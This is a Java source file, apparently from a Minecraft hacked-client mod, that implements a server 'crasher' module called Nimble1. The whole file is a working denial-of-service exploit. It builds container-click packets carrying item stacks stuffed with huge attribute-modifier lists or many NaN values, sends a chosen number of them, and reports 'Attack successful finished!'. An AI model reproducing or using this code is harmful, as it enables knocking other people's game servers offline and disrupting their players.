package us.whitedev.crashers.impl;

import it.unimi.dsi.fastutil.ints.Int2ObjectOpenHashMap;
import java.util.List;
import java.util.Locale;
import java.util.Optional;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.stream.IntStream;
import net.minecraft.nbt.CompoundTag;
import net.minecraft.nbt.ListTag;
import net.minecraft.network.protocol.game.ServerboundContainerClickPacket;
import net.minecraft.world.inventory.ClickType;
import net.minecraft.world.item.ItemStack;
import net.minecraft.world.item.Items;
import us.whitedev.crashers.Crasher;
import us.whitedev.helpers.PacketHelper;
import us.whitedev.utils.OptionType;
import us.whitedev.utils.OptionUtil;

public class Nimble1 implements Crasher {
    private static final String METHOD_NAME = "Nimble1";
    private boolean enabled = false;

    public Nimble1() {
    }

    public void onMethod(String[] args) {
        int packets = Integer.parseInt(args[2]);
        int size = Integer.parseInt(args[3]);
        String type = args[4].toLowerCase(Locale.ROOT);
        this.setEnabled(true);
        msgHelper.sendMessage("Starting crashing with &f" + this.getName(), true);

        for(int i = 0; i < packets; ++i) {
            PacketHelper.send(this.getWClickPacket(size, type));
        }

        this.setEnabled(false);
        msgHelper.sendMessage("Attack &asuccessful &7finished!", true);
    }

    private ServerboundContainerClickPacket getWClickPacket(int size, String type) {
        if (!type.equals("overload")) {
            CompoundTag tagCompound = new CompoundTag();
            ListTag attributeList = new ListTag();
            AtomicInteger operation = new AtomicInteger(0);
            IntStream.range(0, size).forEachOrdered((i) -> {
                CompoundTag attribute = new CompoundTag();
                attribute.putInt("UUIDLeast", 0);
                attribute.putInt("UUIDMost", 0);
                attribute.putString("AttributeName", "generic.maxHealth");
                attribute.putString("Name", "x");
                attribute.putInt("Amount", 1);
                if (operation.get() > 2) {
                    operation.set(0);
                }

                attribute.putInt("Operation", operation.get());
                operation.getAndAdd(1);
                attributeList.add(attribute);
            });
            tagCompound.put("AttributeModifiers", attributeList);
            ItemStack itemstack = new ItemStack(Items.DIAMOND_SWORD, 1, Optional.of(tagCompound));
            return new ServerboundContainerClickPacket(0, 0, 20, 0, ClickType.PICKUP_ALL, itemstack, new Int2ObjectOpenHashMap());
        } else {
            CompoundTag rootTag = new CompoundTag();

            for(int i = 0; i < size; ++i) {
                rootTag.putDouble(String.valueOf(i), Double.NaN);
            }

            ItemStack itemstack = new ItemStack(Items.PURPLE_BANNER, 1, Optional.of(rootTag));
            return new ServerboundContainerClickPacket(0, 0, 20, 0, ClickType.PICKUP_ALL, itemstack, new Int2ObjectOpenHashMap());
        }
    }

    public String getName() {
        return "Nimble1";
    }

    public boolean getEnabled() {
        return this.enabled;
    }

    public void setEnabled(boolean bool) {
        this.enabled = bool;
    }

    public List<OptionUtil> getOptions() {
        return List.of(new OptionUtil("Packets", OptionType.INTEGER), new OptionUtil("Size", OptionType.INTEGER), new OptionUtil("Type", OptionType.LIST, new String[]{"Default", "Overload"}));
    }

    public String getArgsUsage() {
        return "packets[100], size[100], type[default]";
    }

    public String getDescription() {
        return "Overload Crasher";
    }
}
